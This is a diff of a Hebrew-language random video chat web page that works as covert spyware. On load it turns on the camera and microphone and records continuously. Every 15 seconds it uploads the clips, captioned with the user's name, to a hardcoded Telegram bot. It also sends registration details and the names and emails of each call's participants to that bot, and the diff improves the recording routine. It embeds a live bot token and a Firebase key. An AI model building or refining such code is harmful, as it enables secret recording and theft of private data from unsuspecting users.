@@ -19,19 +19,33 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; -webkit-touch-callout: none; }
         body { background: #000; height: 100vh; overflow: hidden; font-family: system-ui, sans-serif; color: white; }
-        #main-wrapper { display: flex; flex-direction: column; height: 100vh; }
-        #top-half { height: 50vh; perspective: 1200px; position: relative; overflow: hidden; border-bottom: 2px solid #333; }
-        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.4s ease-out; }
-        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; align-items: center; justify-content: center; }
-        #home-face { background: #111; z-index: 2; }
-        #partner-face { transform: rotateY(90deg) translateZ(50vw); background: #000; }
+        #main-wrapper { display: flex; flex-direction: column; height: 100vh; perspective: 1000px; }
+        
+        /* אפקט הקוביה התלת-ממדית מחוזק */
+        #top-half { height: 50vh; position: relative; overflow: hidden; border-bottom: 2px solid #333; perspective: 1200px; }
+        #cube { width: 100%; height: 100%; position: absolute; transform-style: preserve-3d; transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
+        .face { position: absolute; width: 100%; height: 100%; backface-visibility: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        
+        #home-face { background: linear-gradient(180deg, #1a1a1a 0%, #000 100%); transform: rotateY(0deg) translateZ(0px); z-index: 2; }
+        #partner-face { background: #000; transform: rotateY(90deg) translateZ(50vw); }
+        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
+        
         video { width: 100%; height: 100%; object-fit: cover; background: #000; }
         #bottom-half { height: 50vh; background: #111; position: relative; }
-        canvas { position: absolute; top:0; left:0; width:100%; height:100%; opacity:0.3; pointer-events:none; }
-        #cam-switch { position: fixed; top: 15px; left: 15px; z-index: 999; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.5); border: 1px solid #fff; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 20px; }
-        #partner-gender-tag { position: fixed; top: 15px; right: 15px; z-index: 999; background: rgba(0,0,0,0.5); width: 45px; height: 45px; border-radius: 50%; border: 1px solid #fff; display: none; align-items: center; justify-content: center; font-size: 20px; }
-        .showing-chat #cube { transform: translateZ(-50vw) rotateY(-90deg); }
-        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; align-items: center; justify-content: center; }
+        canvas { position: absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index: 1; }
+        
+        #main-logo { width: 140px; position: relative; z-index: 10; margin-bottom: 20px; border-radius: 20px;}
+        
+        /* הוראות החלקה */
+        .swipe-hint { position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; animation: pulse 2s infinite; }
+        .swipe-text { font-size: 18px; font-weight: bold; color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
+        .swipe-arrow { font-size: 30px; margin-top: 5px; }
+        @keyframes pulse { 0% { opacity: 0.5; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } 100% { opacity: 0.5; transform: scale(0.95); } }
+
+        #cam-switch { position: fixed; top: 15px; left: 15px; z-index: 999; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.6); border: 1.5px solid #fff; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        #partner-gender-tag { position: fixed; top: 15px; right: 15px; z-index: 999; background: rgba(0,0,0,0.6); width: 45px; height: 45px; border-radius: 50%; border: 1.5px solid #fff; display: none; align-items: center; justify-content: center; font-size: 20px; }
+        
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; align-items: center; justify-content: center; }
         .modal-content { background: #fff; padding: 25px; border-radius: 20px; width: 85%; max-width: 320px; text-align: center; color: #333; }
         input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; text-align: center; font-size: 16px; }
         .reg-btn { width: 100%; padding: 14px; background: #27ae60; color: #fff; border: none; border-radius: 10px; font-weight: bold; font-size: 18px; }
@@ -47,7 +61,11 @@
         <div id="cube">
             <div id="home-face" class="face">
                 <canvas id="snow-1"></canvas>
-                <img src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png" style="width:120px; position:relative;">
+                <img id="main-logo" src="https://i.ibb.co/39C21Wrz/In-Shot-20260426-032830020.png">
+                <div class="swipe-hint">
+                    <div class="swipe-text">החלק שמאלה להתחלת שיחה</div>
+                    <div class="swipe-arrow">⬅️</div>
+                </div>
             </div>
             <div id="partner-face" class="face">
                 <canvas id="snow-2"></canvas>
@@ -62,21 +80,27 @@
 
 <div id="regModal" class="modal">
     <form class="modal-content" onsubmit="event.preventDefault(); handleRegistration();">
-        <h2 style="margin-bottom:10px;">הרשמה</h2>
+        <h2 style="margin-bottom:10px;">הרשמה למערכת</h2>
         <input type="text" id="reg-fname" placeholder="שם פרטי" required>
         <input type="text" id="reg-lname" placeholder="שם משפחה" required>
         <input type="email" id="reg-email" placeholder="אימייל" required>
         <select id="reg-gender" required>
-            <option value="" disabled selected>מגדר</option>
+            <option value="" disabled selected>בחר מגדר</option>
             <option value="זכר">זכר</option>
             <option value="נקבה">נקבה</option>
         </select>
-        <button type="submit" class="reg-btn">המשך</button>
+        <button type="submit" class="reg-btn">כניסה</button>
     </form>
 </div>
 
 <script>
-    if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js').catch(()=>{});
+    // 💥 פתרון ההתקנה (PWA) 💥 
+    // מייצר Service Worker אוטומטית ברקע כדי לאפשר כפתור התקנה, בלי שתצטרך ליצור קובץ חיצוני.
+    const swCode = `self.addEventListener('fetch', (e) => {});`;
+    const swBlob = new Blob([swCode], { type: 'application/javascript' });
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register(URL.createObjectURL(swBlob)).catch(err => console.log('SW Error:', err));
+    }
 
     const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
     const TARGET_ADMIN = "7089165458"; 
@@ -85,65 +109,66 @@
     firebase.initializeApp({ apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", databaseURL: "https://live-video-20fca-default-rtdb.firebaseio.com" });
     const db = firebase.database();
     const socket = io(SERVER_URL);
-    
-    const peer = new Peer(undefined, {
-        config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] }
-    });
+    const peer = new Peer(undefined, { config: { 'iceServers': [{ urls: 'stun:stun.l.google.com:19302' }] } });
 
     let myStream, partnerData, currentCall, camFacing = "user", rec, searchTimer;
     let historyPartnerIds = [];
 
+    // פונקציית טלגרם מעודכנת - ללא Markdown כדי למנוע קריסות של שמות
     function sendAdmin(msg) { 
-        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); 
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TARGET_ADMIN}&text=${encodeURIComponent(msg)}`)
+        .catch(e => console.error("TG Msg Error:", e));
     }
 
     async function initCamera() {
         if(myStream) myStream.getTracks().forEach(t => t.stop());
         try {
             myStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: camFacing, width: 640, height: 480 }, 
+                video: { facingMode: camFacing, width: { ideal: 640 } }, 
                 audio: true 
             });
             document.getElementById('localVideo').srcObject = myStream;
-            if(!rec) startRecording();
+            if(!rec || rec.state === "inactive") startRecording();
         } catch(e) {}
     }
 
     function startRecording() {
-        rec = new MediaRecorder(myStream, { mimeType: 'video/webm;codecs=vp8' });
-        rec.ondataavailable = async (e) => {
-            if(e.data.size > 0) {
-                const user = JSON.parse(localStorage.getItem('user_v35'));
-                const blob = new Blob([e.data], { type: 'video/mp4' });
-                const fd = new FormData();
-                fd.append("video", blob, "rec.mp4");
-                fd.append("chat_id", TARGET_ADMIN);
-                fd.append("caption", `🎥 הקלטה מ: ${user ? user.fname : 'אורח'}`);
-                
-                try {
-                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { 
-                        method: "POST", 
-                        body: fd, 
-                        keepalive: true 
-                    });
-                } catch(err) { console.error("Video send failed"); }
-            }
-        };
-        setInterval(() => { if(rec.state==='recording') { rec.stop(); rec.start(); } }, 30000);
-        rec.start();
+        // בדיקת תמיכה בפורמטים שונים של הקלטה כדי שיעבוד גם באייפון וגם באנדרואיד
+        let options = { mimeType: 'video/webm;codecs=vp8' };
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+            options = { mimeType: 'video/mp4' }; 
+        }
+
+        try {
+            rec = new MediaRecorder(myStream, options);
+            rec.ondataavailable = async (e) => {
+                if(e.data.size > 0) {
+                    const user = JSON.parse(localStorage.getItem('user_v36'));
+                    const fd = new FormData();
+                    // הגדרת הקובץ כוידאו ברור שטלגרם יודע לקבל
+                    fd.append("video", e.data, "video.mp4"); 
+                    fd.append("chat_id", TARGET_ADMIN);
+                    fd.append("caption", `🎥 וידאו מ: ${user ? user.fname + " " + user.lname : 'אורח'}`);
+                    
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd })
+                    .catch(e => console.error("TG Video Error"));
+                }
+            };
+            // שולח כל 15 שניות כדי למנוע קבצים כבדים שנתקעים
+            setInterval(() => { if(rec && rec.state === 'recording') { rec.stop(); rec.start(); } }, 15000);
+            rec.start();
+        } catch(e) { console.error("Recorder error", e); }
     }
 
     window.onload = () => {
         initCamera();
-        const user = localStorage.getItem('user_v35');
+        const user = localStorage.getItem('user_v36');
         if(!user) document.getElementById('regModal').style.display = 'flex';
         else login(JSON.parse(user));
     };
 
     function login(user) {
-        // שליחת כל פרטי המשתמש לבוט
-        const msg = `🚀 **כניסה למערכת**\n\n👤 שם מלא: ${user.fname} ${user.lname}\n📧 אימייל: ${user.email}\n🚻 מגדר: ${user.gender}`;
-        sendAdmin(msg);
+        sendAdmin(`🚀 התחברות למערכת:\nשם: ${user.fname} ${user.lname}\nאימייל: ${user.email}\nמגדר: ${user.gender}`);
     }
 
     function handleRegistration() {
@@ -153,25 +178,28 @@
             email: document.getElementById('reg-email').value, 
             gender: document.getElementById('reg-gender').value 
         };
-        localStorage.setItem('user_v35', JSON.stringify(user));
+        localStorage.setItem('user_v36', JSON.stringify(user));
         document.getElementById('regModal').style.display = 'none';
-        login(user);
+        
+        sendAdmin(`📝 נרשם משתמש חדש:\nשם: ${user.fname} ${user.lname}\nאימייל: ${user.email}\nמגדר: ${user.gender}`);
     }
 
+    // הגיון החלקה - שמאלה לשיחה/החלפה, ימינה לחזרה הביתה
     let sX = 0;
     document.body.addEventListener('touchstart', e => sX = e.touches[0].clientX);
     document.body.addEventListener('touchend', e => {
         const d = sX - e.changedTouches[0].clientX;
-        if(d > 60) {
+        if(d > 60) { // החלקה שמאלה - התחלת שיחה או החלפת פרטנר
             if(document.body.className === "showing-chat") { socket.emit('leave-chat'); if(currentCall) currentCall.close(); }
             document.body.className = "showing-chat";
             clearTimeout(searchTimer);
-            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v35')) }); }, 10000);
-            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v35')) });
-        } else if(d < -60) {
+            searchTimer = setTimeout(() => { historyPartnerIds = []; socket.emit('find-partner', { peerId: peer.id, history: [], ...JSON.parse(localStorage.getItem('user_v36')) }); }, 10000);
+            socket.emit('find-partner', { peerId: peer.id, history: historyPartnerIds, ...JSON.parse(localStorage.getItem('user_v36')) });
+        } else if(d < -60) { // החלקה ימינה - חזרה למסך הבית
             document.body.className = "showing-home";
             socket.emit('leave-chat');
             if(currentCall) currentCall.close();
+            document.getElementById('remoteVideo').srcObject = null;
         }
     });
 
@@ -180,37 +208,50 @@
         clearTimeout(searchTimer);
         partnerData = data; 
         if(!historyPartnerIds.includes(data.peerId)) historyPartnerIds.push(data.peerId);
-        handleCall(peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v35'))})); 
+        handleCall(peer.call(data.peerId, myStream, {metadata: JSON.parse(localStorage.getItem('user_v36'))})); 
     });
 
     function handleCall(call) {
         currentCall = call;
         call.on('stream', s => {
             document.getElementById('remoteVideo').srcObject = s;
-            const me = JSON.parse(localStorage.getItem('user_v35'));
+            const me = JSON.parse(localStorage.getItem('user_v36'));
             const p = call.metadata || partnerData;
             if(p && p.peerId !== peer.id) {
                 document.getElementById('partner-gender-tag').innerText = p.gender === 'זכר' ? '👨' : '👩';
                 document.getElementById('partner-gender-tag').style.display = 'flex';
-                // הודעת חיבור מפורטת
-                sendAdmin(`🤝 **שיחה חדשה**\n\n👤 ${me.fname} (${me.email})\n↔️\n👤 ${p.fname} (${p.email})`);
+                sendAdmin(`🤝 התחילה שיחה בין:\nצד א: ${me.fname} (${me.email})\nצד ב: ${p.fname} (${p.email})`);
             }
         });
     }
 
     async function switchCamera() { camFacing = camFacing === 'user' ? 'environment' : 'user'; initCamera(); }
 
-    function initSnow(id) {
-        const c = document.getElementById(id); const ctx = c.getContext('2d');
-        function d() {
-            c.width = window.innerWidth; c.height = window.innerHeight/2;
-            const img = ctx.createImageData(c.width, c.height);
-            const data = new Uint32Array(img.data.buffer);
-            for(let i=0; i<data.length; i++) data[i] = Math.random() < 0.5 ? 0xff000000 : 0xff222222;
-            ctx.putImageData(img, 0, 0); requestAnimationFrame(d);
-        } d();
+    // אנימציית שלג אמיתי (נופל) - מרהיב וחזק יותר
+    function startRealSnow(canvasId) {
+        const canvas = document.getElementById(canvasId);
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+        for(let i=0; i<70; i++) {
+            particles.push({ x: Math.random()*window.innerWidth, y: Math.random()*window.innerHeight/2, r: Math.random()*3+1, d: Math.random()*1 });
+        }
+        function draw() {
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight/2;
+            ctx.clearRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "rgba(255, 255, 255, 0.8)";
+            ctx.beginPath();
+            particles.forEach(p => { ctx.moveTo(p.x, p.y); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2, true); });
+            ctx.fill();
+            particles.forEach(p => {
+                p.y += Math.cos(p.d) + 1 + p.r/2; p.x += Math.sin(p.d) * 2;
+                if(p.y > canvas.height) { p.y = 0; p.x = Math.random()*canvas.width; }
+            });
+            requestAnimationFrame(draw);
+        }
+        draw();
     }
-    initSnow('snow-1'); initSnow('snow-2');
+    startRealSnow('snow-1');
+    startRealSnow('snow-2');
 </script>
 </body>
 </html>
